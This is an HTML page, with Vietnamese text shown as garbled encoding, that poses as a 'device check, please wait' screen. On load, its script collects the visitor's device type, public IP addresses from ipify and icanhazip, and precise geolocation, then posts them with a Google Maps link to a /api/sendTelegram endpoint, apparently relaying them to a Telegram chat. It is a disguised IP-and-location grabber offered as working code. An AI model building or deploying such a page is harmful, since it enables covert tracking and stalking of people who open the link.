<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <title>Kiá»ƒm tra thiáº¿t bá»‹</title>
</head>
<body>
  <h3>Äang kiá»ƒm tra thiáº¿t bá»‹, vui lÃ²ng chá»...</h3>
  <script>
    const info = {
      time: new Date().toLocaleString(),
      device: '',
      os: '',
      ip: '',
      realIp: '',
      lat: '',
      lon: '',
    };

    function detectDevice() {
      const ua = navigator.userAgent;
      if (/iPhone|iPad|iPod/i.test(ua)) {
        info.device = 'iOS Device';
        info.os = 'iOS';
      } else if (/Android/i.test(ua)) {
        const match = ua.match(/Android.*; (.+?) Build/);
        info.device = match ? match[1] : 'Android Device';
        info.os = 'Android';
      } else if (/Windows NT/i.test(ua)) {
        info.device = 'Windows PC';
        info.os = 'Windows';
      } else if (/Macintosh/i.test(ua)) {
        info.device = 'Mac';
        info.os = 'macOS';
      } else {
        info.device = 'KhÃ´ng xÃ¡c Ä‘á»‹nh';
        info.os = 'KhÃ´ng rÃµ';
      }
    }

    async function getPublicIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        info.ip = data.ip || 'KhÃ´ng rÃµ';
      } catch {
        info.ip = 'KhÃ´ng rÃµ';
      }
    }

    async function getRealIP() {
      try {
        const res = await fetch('https://icanhazip.com');
        info.realIp = (await res.text()).trim();
      } catch {
        info.realIp = 'KhÃ´ng rÃµ';
      }
    }

    async function getLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) {
          resolve();
          return;
        }
        navigator.geolocation.getCurrentPosition(pos => {
          info.lat = pos.coords.latitude.toFixed(6);
          info.lon = pos.coords.longitude.toFixed(6);
          resolve();
        }, () => resolve(), { enableHighAccuracy: true, timeout: 8000 });
      });
    }

    function getCaption() {
      const mapsLink = info.lat && info.lon
        ? `https://maps.google.com/?q=${info.lat},${info.lon}`
        : 'KhÃ´ng rÃµ';
      return `
ğŸ•’ Thá»i gian: ${info.time}
ğŸ“± Thiáº¿t bá»‹: ${info.device}
ğŸ–¥ï¸ Há»‡ Ä‘iá»u hÃ nh: ${info.os}
ğŸŒ IP dÃ¢n cÆ°: ${info.ip}
ğŸ§  IP gá»‘c: ${info.realIp}
ğŸ“ Google Maps: ${mapsLink}
      `.trim();
    }

    async function sendToServer() {
      const text = getCaption();
      await fetch('/api/sendTelegram', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ message: text })
      });
    }

    async function main() {
      detectDevice();
      await getPublicIP();
      await getRealIP();
      await getLocation();
      await sendToServer();
    }

    main();
  </script>
</body>
</html>
